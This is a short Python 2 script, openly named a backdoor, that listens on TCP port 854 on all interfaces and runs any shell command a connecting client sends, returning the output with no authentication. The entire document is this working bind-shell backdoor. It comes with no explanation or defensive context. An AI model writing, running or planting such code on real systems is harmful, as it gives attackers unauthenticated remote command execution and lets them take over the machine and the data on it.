#!/usr/bin/python
#coding:utf-8

import socket 
import sys
import commands
from thread import *

HOST = ''
PORT = 854

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(10)

def clientthread(conn):
    conn.send("Welcome demon's backdoor!".center(50,"*") + "\n")
    while 1:
        conn.send("Demon_Backdoor# ")
        data = conn.recv(1024)
        if data:
            cmd = data.strip("\n")
            code,res = commands.getstatusoutput(cmd)

            if code == 0 :
                conn.sendall(res+"\n")
            else:
                print "[-]Error: code",code
            data = ""

        else:
            break

    conn.close()
        

while 1:
    conn, addr = s.accept()
    print "[+] connecting" , addr[0] + ":" , addr[1]
    start_new_thread(clientthread, (conn,))

s.close()